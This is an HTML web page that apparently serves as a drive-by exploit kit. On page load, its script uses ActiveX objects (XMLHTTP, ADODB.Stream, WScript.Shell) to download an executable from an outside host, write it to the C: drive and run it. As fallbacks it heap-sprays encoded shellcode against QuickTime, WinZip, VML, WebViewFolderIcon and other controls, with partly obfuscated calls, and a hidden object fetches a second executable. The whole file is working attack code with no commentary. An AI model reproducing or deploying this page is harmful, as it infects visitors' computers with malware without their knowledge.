 </textarea><html>
<head>
<title></title>
<object id="VMLRender" classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
</object>
<style>
v\:* { behavior: url(#VMLRender); }
</style>
<script language="JavaScript">

var memory = new Array(), mem_flag = 0;
function having(){ memory = memory; 
setTimeout ("having()" ,1800); }




function ShellExecute(exec, name, type) {
	if (type == 0) { try { exec.Run(name, 0); return 1; } catch(e) { } } 
	else { try { exe.ShellExecute(name); return 1; } catch(e) { } }
	return(0);

}
function GetRandString(len)
{
	var chars = "abcdefghiklmnopqrstuvwxyz", string_length = len, randomstring = '';
	for (var i=0; i<string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}

	return randomstring;
}

function makeSlide()
{
	var heapSprayToAddress = 0x0c0c0c0c;
	var heapBlockSize = 0x400000;

	var payLoadCode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u302F%u6130%u2D30%u3066%u3564%u612D%u3434%u2D65%u3333%u3673%u782E%u732E%u7265%u6976%u6563%u7075%u6164%u6574%u632E%u2F6E%u2F31%u662F%u6C69%u2E65%u6870%u0070");
	var payLoadSize = payLoadCode.length * 2;

	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
	var spraySlide = unescape("%u0c0c%u0c0c");

	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
	
	for (i=0;i<heapBlocks;i++)
		memory[i] = spraySlide + payLoadCode;
	mem_flag = 1;

	having();
	return memory;
}
function getSpraySlide (spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
		spraySlide += spraySlide;

	spraySlide = spraySlide.substring( 0,spraySlideSize / 2 );
	return spraySlide;
}
function startWVF()
{
	for (i=0;i<128;i++) {
		try{ var o = new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1"); fds907f(o);}
		catch(e){ }
	}
}

function startWinZip(object) {
	var xh = 'A'; while (xh.length < 231) xh+='A';
	xh+="\x0c\x0c\x0c\x0c\x0c\x0c\x0c";
	object.CreateNewFolderFromName(xh);
}
function CreateObject(CLSID, name) {
	var r = null;
	try { eval('r = CLSID.CreateObject(name)') }catch(e){}	
	if (! r) { try { eval('r = CLSID.CreateObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.CreateObject(name, "", "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject("", name)') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name)') }catch(e){} }
	return(r);
}
function fds907f(o) { 
	var a=0x7ffffffe, b=0x0c0c0c0c;//, c=0x0c0c0c0c, d=0x0c0c0c0c;
	eval('o.s'+'et'+'Sl'+'ice'+'(a,b,'+'b,b)');
}
function startVML()
{
	var vmlhtml;
	vmlhtml = "<html xmlns:v=\"urn:schemas-microsoft-com:vml\">";
	vmlhtml += "<object id=\"VMLRender\" classid=\"CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E\"></object>";
	vmlhtml += "<style>";
	vmlhtml += "v\:* { behavior: url(#VMLRender); }";
	vmlhtml += "</style>";
	vmlhtml += "<v:rect style='width:120pt;height:80pt' fillcolor=\"red\" >";
	vmlhtml += "<v:recolorinfo recolorstate=\"t\" numcolors=\"97612895\">";
	for(var i=0;i<45;i++) {vmlhtml += "<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\" lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\" fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/>";}
	vmlhtml += "<v/recolorinfo>";
	document.getElementById('vmldiv').innerHTML = vmlhtml;
}

function XMLHttpDownload(xml, url) {

	try {
		xml.open("GET", url, false);
		xml.send(null);

	} catch(e) { return 0; }

	return xml.responseBody;
}
function ADOBDStreamSave(o, name, data) {
	try {
		o.Type = 1; o.Mode = 3; o.Open(); o.Write(data); o.SaveToFile(name, 2); o.Close();
	} 
	catch(e) { return 0; }
	return 1;
}


function startOverflow(num)
{
	if (num == 0) {
		try {
			var qt = new ActiveXObject('QuickTime.QuickTime');		
			if (qt) {
				var qthtml = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+
				'<param name="src" value="qtss.php">'+
				'<param name="autoplay" value="true">'+
				'<param name="loop" value="false">'+
				'<param name="controller" value="true">'+
				'</object>';
				if (! mem_flag) makeSlide();
				document.getElementById('mydiv').innerHTML = qthtml;
				num = 255;
			}
		} catch(e) { }

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);

	}

	else if (num == 1) {
			try {
				var exploitstr  = '<embed autostart="true" src="25.png" type="video/x-ms-wmv" width="1" height="1" controls="ImageWindow" console="cons"></embed>';
				document.getElementById('mydiv').innerHTML = exploitstr;
				num = 255;
		} catch(e) { }
		
		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);	

	}
	else if (num == 2) {
		try {
			var winzip = document.createElement("object");
			winzip.setAttribute("classid", "clsid:A09AE68F-B14D-43ED-B713-BA413F034904");

			var ret=winzip.CreateNewFolderFromName(unescape("%00"));
			if (ret == false) {
				if (! mem_flag) makeSlide();
				startWinZip(winzip);
				num = 255;
			}

		} catch(e) { }

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);

	} else if (num == 3) {

		try {
		   	var budda_blia = new ActiveXObject('Sb.SuperBuddy.1');

			if (budda_blia) {
				if (! mem_flag) makeSlide();
				budda_blia.LinkSBIcons(0x0c0c0c0c);
				num = 255;
			}
		} catch(e) { }

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);

	} else if (num == 4) {

		try {
			var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
			if (tar) {
				if (! mem_flag) makeSlide();
				startWVF();
				num = 255;
			}
		} catch(e) { }

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);


	} else if (num == 5) {
		
	        try {
			if (! mem_flag) makeSlide();
			startXML();
			num = 255;

		} catch(e) { }

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);

	} else if (num == 6) {

		try {
			if (! mem_flag) makeSlide();
			startVML();
			num = 255;
		} catch(e) {}

		if (num == 255) setTimeout("startOverflow(" + (num+1) + ")", 2000);
		else startOverflow(num + 1);

	} else if (num == 7) {		
		if (! mem_flag) makeSlide();
		try {
			var mmed = document.createElement("object");
			if (mmed) {
				var mms='';
				mmed.setAttribute("classid", "clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC");

				for(i=0;i<4120;i++) { mms += "A"; }
				mms+="\x0c\x0c\x0c\x0c";
				mmed.SetFormatLikeSample(mms);
			}
		} catch(e) { }
	}
}

function startXML() 
{
	document.write('<object id="xhtml" classid="clsid:88d969c5-f192-11d4-a65f-0040963251e5" style="position:absolute;left:-1000;width:1;height:1"></object>');

	obj = document.getElementById('xhtml').object;
	if (!obj) return;

	try {obj.open(new Array(),new Array(),new Array(),new Array(),new Array());} catch(e) {}

	nps = unescape("%u0D0D%u0D0D");
	sh = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u302F%u6130%u2D30%u3066%u3564%u612D%u3434%u2D65%u3333%u3673%u782E%u732E%u7265%u6976%u6563%u7075%u6164%u6574%u632E%u2F6E%u2F31%u662F%u6C69%u2E65%u6870%u0070%u713F%u783D%u6C6D");

	sz = sh.length * 2;
	npsz = 0x400000-(sz+0x38);

	while (nps.length*2<npsz) nps+=nps;
	ihbc = (0x12000000-0x400000)/0x400000;
	mm = new Array();
	for (i=0;i<ihbc;i++) mm[i] = nps+sh;

	obj.open(new Object(),new Object(),new Object(),new Object(), new Object());    

	obj.setRequestHeader(new Object(),'......');
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
	obj.setRequestHeader(new Object(),0x12345678);
}

function MDAC() { 

	var t = new Array("{BD96C556-65A3-11D0-983A-00C04FC29E30}","{BD96C556-65A3-11D0-983A-00C04FC29E36}","{AB9BCEDD-EC7E-47E1-9322-D4A210617116}","{0006F033-0000-0000-C000-000000000046}","{0006F03A-0000-0000-C000-000000000046}","{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}","{6414512B-B978-451D-A0D8-FCFDF33E833C}","{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}","{06723E09-F4C2-43c8-8358-09FCD1DB0766}","{639F725F-1B2D-4831-A9FD-874847682010}","{BA018599-1DB3-44f9-83B4-461454C84BF8}","{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}","{E8CCCDDF-CA28-496b-B050-6C07C962476B}", null);
	var v = new Array(null, null, null), i = 0, n = 0, ret = 0, urlRealExe = 'http://00a0-f0d5-a44e-33s6.x.serviceupdate.cn/1//file.php';

	while (t[i] && (! v[0] || ! v[1] || ! v[2]) ) {
		var a = null;
		try {
			a = document.createElement("object"); 
			a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
		}
		catch(e) 
		{ a = null; }

		if (a) {
			if (! v[0]) { v[0] = CreateObject(a, "msxml2.XMLHTTP");if (! v[0]){v[0] = CreateObject(a, "Microsoft.XMLHTTP"); } if (! v[0]){v[0] = CreateObject(a, "MSXML2.ServerXMLHTTP"); }}
			if (! v[1]) { v[1] = CreateObject(a, "ADODB.Stream"); }
			if (! v[2]) { v[2] = CreateObject(a, "WScript.Shell"); if (! v[2]) { v[2] = CreateObject(a, "Shell.Application"); if(v[2]) { n=1 }; }}
			} i++;
	}
	if (v[0] && v[1] && v[2]) 
	{
		var data = XMLHttpDownload(v[0], urlRealExe);
		if (data != 0) {
			var name = "c:"+"\\auto" + GetRandString(4) + ".ex" + "e";
			if (ADOBDStreamSave(v[1], name, data) == 1) { if (ShellExecute(v[2], name, n) == 1) ret=1; }
		}
	}
	return ret;
}
function start() { if (!MDAC()) startOverflow(0); }
</script>

</head>
<body onload="start()">
<div id="mydiv"></div>
<div id="vmldiv"></div>
<object classid='clsid:24F3EAD6-8B87-4C1A-97DA-71C126BDA08F' id='yh8'></object><script language="javascript"> try { yh8.GetFile("http://00a0-f0d5-a44e-33s6.x.serviceupdate.cn/1//file.php?q=yh8","c:\\msvs7.exe",5,1,"msvs7"); } catch(e){ }</script>
</body>
</html>